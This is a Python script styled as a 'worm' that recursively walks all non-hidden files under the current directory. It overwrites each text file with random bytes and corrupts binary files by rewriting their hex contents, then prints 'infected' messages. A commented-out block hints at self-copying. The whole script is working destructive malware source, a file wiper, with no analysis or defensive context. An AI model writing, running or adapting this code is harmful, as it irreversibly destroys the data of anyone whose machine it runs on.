import sys
import random
import time
import subprocess
import platform
import os

directories = []
try:
    if "Windows" in platform.platform():
        subprocess.run("cd\\")
    else:
        subprocess.run("cd /")
except:
    pass
filename = sys.argv[0]

class worm_drive:
    def __init(self):
        pass

    @staticmethod
    def cascade(filename):
        try:
            with open(filename, 'r') as f:
                contents = f.read()
                size = len(contents.split("\n"))

            def random_string(s):
                rchar = ''
                for _ in range(s):
                    rchar = rchar + chr(random.randint(0, 255))
                return rchar

            with open(filename, 'w') as f:
                for i in range(size):
                    f.write(random_string(random.randint(0, 255)))
        except:
            try:
                with open(filename, 'rb') as f:
                    contents = f.read().hex()
                contents = contents.replace("3", "0")
                with open(filename, 'wb') as f:
                    f.write(bytes.fromhex(contents))
            except:
                pass

    def filtering_and_expanding(self, path):
        for sub_dirs in os.listdir(path):
            if not sub_dirs.startswith('.') and not sub_dirs.startswith(str(filename)):
                directories.append(path + '/' + sub_dirs)

    def copies(self, path):
        try:
            destination_file = path
            worm_drive.cascade(destination_file)
        except:
            pass

        '''try:
              destination = path
              shutil.copy(filename, destination)
          except Exception as e:
              print(e)'''

    def starting(self):
        self.filtering_and_expanding(os.getcwd())

    def initialiting(self):
        for i in directories:
            if os.path.isdir(i):
                available_directories = i
                self.filtering_and_expanding(available_directories)
            if os.path.isfile(i):
                self.copies(i)

    def worm_spreading(self):
        self.initialiting()
        for i in directories:
            try:
                print('[+] Successfully infected file or directory: ' + i)
                time.sleep(1)
            except Exception as e:
                print('[-] file infection failed on ' + i + " reason is " + str(e))
                time.sleep(1)


w = worm_drive()

w.starting()
w.worm_spreading()
